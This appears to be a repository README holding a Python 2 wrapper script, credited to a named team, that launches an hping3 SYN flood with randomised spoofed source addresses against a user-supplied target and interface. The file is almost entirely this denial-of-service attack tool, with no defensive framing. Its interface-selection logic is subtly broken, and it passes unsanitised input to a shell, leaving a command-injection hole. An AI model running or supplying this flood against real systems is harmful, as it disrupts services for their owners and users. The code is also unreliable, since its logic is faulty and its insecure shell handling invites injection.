# practical_security_2

# hping3 python script

YouTube: https://www.youtube.com/watch?v=-DNpohuBftA

import subprocess
import sys

#*********************************************************************************
print"************************CR3ATED BY THE DR3@M T3AM********************************"
print"*************************@simatech Nyasha Simango********************************"
print"************************* @Mtape Kudzai S Kangwende******************************"
print"*************************@zapiro Anesu     Chiodza*******************************"
print"*************************@dutch Tsitsi H Sithole*********************************"
print"*************************@v!nx Vincent F Munhuweyi*******************************"


target=raw_input("Input Target Machine ")
packet=raw_input("Input Packet Size ")
network=raw_input("Input Interface [e] Ethernet , [w] Wireless ")

value=ord(network)
interface=""
if (value==101):
    interface="eth0"
    
elif (value==119):
    interface="wlan0"
    
if (value==69 ):
    interface="eth0"
    
elif (value==87):
    interface="wlan0"

else:
    interface="wlan0"




hping3mod = "hping3 -S -V --flood -d "+packet +" --interface "+interface +" --rand-source "+target  

p = subprocess.Popen(hping3mod, shell=True, stderr=subprocess.PIPE)
while True:
    out = p.stderr.read(1)
    if out == '' and p.poll() != None:
        break
    if out != '':
        sys.stdout.write(out)
        sys.stdout.flush()
